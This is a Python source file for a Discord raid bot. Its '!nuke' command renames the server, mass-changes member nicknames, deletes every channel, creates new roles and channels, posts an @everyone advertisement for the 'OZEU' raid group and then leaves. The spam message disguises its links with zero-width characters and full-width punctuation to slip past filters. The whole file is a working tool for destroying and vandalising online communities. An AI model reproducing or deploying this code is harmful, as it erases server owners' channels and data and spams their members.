# main.py
import os
import asyncio
import logging
from datetime import datetime
from typing import List
import threading

import discord
from discord.ext import commands
from flask import Flask, jsonify

# ==================================================
# ---------------- CONFIG ----------------
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = "!"

# --- Intents ---
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True  

# --- Names & Counts ---
GUILD_NEW_NAME         = "おぜう植民地"        # サーバー名
ROLE_BASE              = "ozeumember"         # ロール名ベース
ROLE_COUNT             = 1                    # 作成するロール数
CHANNEL_BASE           = "ozeu-nuke"          # チャンネル名ベース
CHANNEL_COUNT          = 1                   # 作成するチャンネル数

# --- Messages ---
REPEAT_MESSAGE         = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
REPEAT_COUNT           = 1                    # 各チャンネルに送信する回数

# --- Nicknames ---
CHANGE_NICKNAMES       = True
NICK_BASE              = "おぜう様万歳！"     # ニックネームベース
NICK_CHUNK_SIZE        = 12
NICK_CHUNK_SLEEP       = 0.12

# --- Parallelism / timing ---
DELETE_CHUNK_SIZE      = 8     # チャンネル削除まとめ数
DELETE_CHUNK_SLEEP     = 0.08
CREATE_CHUNK_SIZE      = 6     # チャンネル作成まとめ数
CREATE_CHUNK_SLEEP     = 0.12
MSG_CHUNK_SIZE         = 10    # メッセージ送信まとめ数
MSG_INTER_CHUNK_SLEEP  = 0.01
MSG_INTER_ROUND_SLEEP  = 0.02
POST_DELETE_WAIT       = 2.0
ROLE_CHUNK_SIZE        = 3     # ロール作成まとめ数
ROLE_SLEEP             = 0.05  # ロール作成の間隔
# ==================================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("fast-nuke")

bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

# --- Flask health check ---
@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None}), 200

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# --- helpers ---
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {getattr(channel, 'name', repr(channel))} ({channel.id})")
    except Exception as e:
        logger.warning(f"Delete failed {getattr(channel, 'name', channel)}: {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        logger.info(f"Created channel: {name} ({ch.id})")
        await asyncio.sleep(0.1)
        return ch
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

async def safe_send(ch: discord.TextChannel, content: str, max_retries=3):
    if not ch or not content:
        return
    retries = 0
    while True:
        try:
            await ch.send(content[:2000])
            return
        except discord.errors.Forbidden:
            logger.warning(f"Forbidden: cannot send to {getattr(ch,'name',ch)}")
            return
        except discord.errors.HTTPException as e:
            retries += 1
            if retries > max_retries:
                logger.warning(f"HTTPException send failed {getattr(ch,'name',ch)}: {e}")
                return
            await asyncio.sleep(0.5 * (2 ** (retries - 1)))
        except Exception as e:
            logger.exception(f"Unexpected send error {getattr(ch,'name',ch)}: {e}")
            return

async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    if not channels or not msg:
        return
    for _ in range(repeat):
        for i in range(0, len(channels), MSG_CHUNK_SIZE):
            chunk = channels[i:i+MSG_CHUNK_SIZE]
            await asyncio.gather(*(safe_send(ch, msg) for ch in chunk))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

# --- nickname ---
async def safe_change_nick(member: discord.Member, new_nick: str):
    try:
        await member.edit(nick=new_nick)
        return True
    except Exception as e:
        logger.warning(f"Cannot change nick for {member}: {e}")
        return False

async def change_all_nicknames(guild: discord.Guild, base: str, chunk_size: int = 12, chunk_sleep: float = 0.12):
    members = [m for m in guild.members if not m.bot]
    idx = 1
    tasks = [(m, f"{base}-{idx+i}") for i, m in enumerate(members)]
    changed = 0
    for group in chunk_list(tasks, chunk_size):
        coros = [safe_change_nick(m, nick) for (m, nick) in group]
        results = await asyncio.gather(*coros)
        changed += sum(1 for r in results if r)
        await asyncio.sleep(chunk_sleep)
    return changed

# --- permissions ---
def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames

# --- events ---
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} ({bot.user.id})")

# --- role creation ---
async def create_roles(guild: discord.Guild, count: int, base: str):
    roles = []
    names = [f"{base}-{i}" for i in range(1, count+1)]
    for group in chunk_list(names, ROLE_CHUNK_SIZE):
        results = await asyncio.gather(*(guild.create_role(name=nm, permissions=discord.Permissions.none()) for nm in group))
        roles.extend(results)
        await asyncio.sleep(ROLE_SLEEP)
    return roles

# --- main command ---
@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    if guild is None or not bot_has_permissions(guild):
        await ctx.send("Bot に必要な権限がありません。")
        return

    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke 開始")

    # rename guild
    if GUILD_NEW_NAME:
        await guild.edit(name=GUILD_NEW_NAME)
        await backup_channel.send(f"🔁 サーバー名を \"{GUILD_NEW_NAME}\" に変更しました。")

    # change nicknames
    if CHANGE_NICKNAMES:
        await backup_channel.send("👥 ニックネーム変更中...")
        changed_count = await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
        await backup_channel.send(f"👥 ニックネーム変更完了: 成功 {changed_count}")

    # delete channels
    channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
    for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
        await asyncio.gather(*(safe_delete_channel(c) for c in group))
        await asyncio.sleep(DELETE_CHUNK_SLEEP)
    await asyncio.sleep(POST_DELETE_WAIT)

    # create roles
    roles = await create_roles(guild, ROLE_COUNT, ROLE_BASE)
    await backup_channel.send(f"🔨 ロール作成完了 {len(roles)} 個")

    # create channels
    created_channels = []
    names = [f"{CHANNEL_BASE}-{i}" for i in range(1, CHANNEL_COUNT+1)]
    for group in chunk_list(names, CREATE_CHUNK_SIZE):
        results = await asyncio.gather(*(safe_create_channel(guild, nm) for nm in group))
        created_channels.extend([ch for ch in results if ch])
        await asyncio.sleep(CREATE_CHUNK_SLEEP)
    await backup_channel.send(f"🆕 チャンネル作成完了 {len(created_channels)} 件")

    # send repeated messages
    await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
    await backup_channel.send("✅ nuke 全工程完了")

    await asyncio.sleep(1.0)
    try:
        await guild.leave()
    except Exception as e:
        logger.exception(f"Failed to leave guild: {e}")

# Entrypoint
if __name__ == "__main__":
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask started")

    if not TOKEN:
        logger.error("DISCORD_TOKEN が設定されていません。")
        raise SystemExit("DISCORD_TOKEN is required")
    bot.run(TOKEN)
